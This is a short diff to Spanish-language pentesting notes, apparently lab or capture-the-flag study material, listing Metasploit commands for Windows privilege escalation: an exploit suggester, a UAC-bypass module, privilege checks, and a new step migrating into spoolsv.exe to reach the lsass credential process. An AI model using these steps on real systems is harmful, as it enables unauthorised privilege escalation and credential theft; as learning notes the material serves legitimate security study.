@@ -29,7 +29,7 @@ Para encontrar que exploits se pueden usar para ***PRIV ESC***
 ```
 run post/multi/recon/local_exploit_suggester
 CTRL+z
-set session 1
+set session 1 # Ve las opciones para que veas que pide que pongas una session
 use exploit/windows/local/bypassuac_eventvwr
 show options
 set lhost
@@ -42,6 +42,13 @@ Para ver los privilegios
 
 ```
 getprivs
+```
+
+Para migrar a procesos que puedan manipilar el lsass
+
+```
+migrate -N spoolsv.exe
+
 ```
 
 ### Encontrar scripts nmap SMB
